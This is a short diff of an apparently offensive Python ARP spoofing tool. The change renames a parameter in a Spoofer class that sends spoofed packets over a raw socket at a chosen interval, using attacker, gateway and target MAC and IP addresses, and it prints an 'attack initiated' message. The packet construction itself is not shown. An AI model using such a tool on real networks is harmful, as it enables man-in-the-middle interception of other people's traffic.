@@ -108,15 +108,15 @@ class AttackPackets(object):
 
 
 class Spoofer(object):
-    def __init__(self, interface: str, *, arp_packets):
+    def __init__(self, interface: str, *, spoofed_packets):
         self.interface = interface
-        self.arp_packets = arp_packets
+        self.spoofed_packets = spoofed_packets
 
     def execute(self, *, max_packets: int, interval: float):
         with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
             sock.bind((self.interface, htons(0x0800)))
             for packet_count in count(start=1):
-                for packet in self.arp_packets:
+                for packet in self.spoofed_packets:
                     sock.send(packet)
                 time.sleep(interval)
                 if packet_count == max_packets:
@@ -128,7 +128,7 @@ def spoof(args):
     packets = AttackPackets(attacker_mac=args.attackermac,
                             gateway_mac=args.gatemac, gateway_ip=args.gateip,
                             target_mac=args.targetmac, target_ip=args.targetip)
-    spoofer = Spoofer(interface=args.interface, arp_packets=packets)
+    spoofer = Spoofer(interface=args.interface, spoofed_packets=packets)
 
     current_time = time.strftime("%H:%M:%S", time.localtime())
     print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
